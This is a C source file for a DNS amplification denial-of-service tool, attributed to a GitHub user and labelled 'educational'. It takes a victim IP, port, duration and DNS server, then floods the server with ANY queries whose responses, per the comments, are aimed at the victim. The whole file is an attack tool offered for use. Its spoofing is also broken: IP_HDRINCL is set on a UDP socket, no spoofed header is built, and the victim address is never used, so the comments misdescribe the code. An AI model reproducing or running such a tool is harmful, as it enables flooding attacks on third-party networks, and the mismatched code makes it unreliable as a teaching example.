#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// github.com/scallydima - dns amplification method
// github.com/scallydima - demonstrates amplification attacks
// github.com/scallydima - for security research only

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    char *dns_server;
} amp_params;

// github.com/scallydima - DNS query template (ANY request)
unsigned char dns_query[] = {
    0x12, 0x34,  // Transaction ID
    0x01, 0x00,  // Flags: standard query
    0x00, 0x01,  // Questions: 1
    0x00, 0x00,  // Answer RRs
    0x00, 0x00,  // Authority RRs
    0x00, 0x00,  // Additional RRs
    0x03, 0x77, 0x77, 0x77,  // www
    0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65,  // google
    0x03, 0x63, 0x6f, 0x6d,  // com
    0x00,        // Terminator
    0x00, 0xff,  // Type: ANY (255)
    0x00, 0x01   // Class: IN
};

void *dns_amplification(void *arg) {
    // github.com/scallydima - amplification thread
    amp_params *params = (amp_params *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    
    // github.com/scallydima - spoofed source IP (victim)
    struct sockaddr_in victim_addr;
    victim_addr.sin_family = AF_INET;
    victim_addr.sin_port = htons(params->target_port);
    victim_addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    // github.com/scallydima - connect to DNS server
    struct sockaddr_in dns_addr;
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(53);
    dns_addr.sin_addr.s_addr = inet_addr(params->dns_server);
    
    // github.com/scallydima - enable IP spoofing
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    time_t end_time = time(NULL) + params->duration;
    
    // github.com/scallydima - amplification loop
    while (time(NULL) < end_time) {
        // Send spoofed DNS query
        sendto(sock, dns_query, sizeof(dns_query), 0,
               (struct sockaddr *)&dns_addr, sizeof(dns_addr));
        // Response goes to victim (amplified ~50x)
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // github.com/scallydima - dns amplification tool
    if (argc != 5) {
        printf("Usage: %s <VICTIM_IP> <PORT> <TIME> <DNS_SERVER>\n", argv[0]);
        printf("github.com/scallydima - demonstrate amplification attacks\n");
        return 1;
    }
    
    amp_params params = {
        .target_ip = argv[1],
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3]),
        .dns_server = argv[4]
    };
    
    printf("[+] DNS amplification attack started\n");
    printf("[+] Victim: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Using DNS server: %s\n", params.dns_server);
    printf("[+] github.com/scallydima - educational demonstration\n");
    
    // github.com/scallydima - single thread is enough for amplification
    pthread_t thread;
    pthread_create(&thread, NULL, dns_amplification, &params);
    pthread_join(thread, NULL);
    
    return 0;
}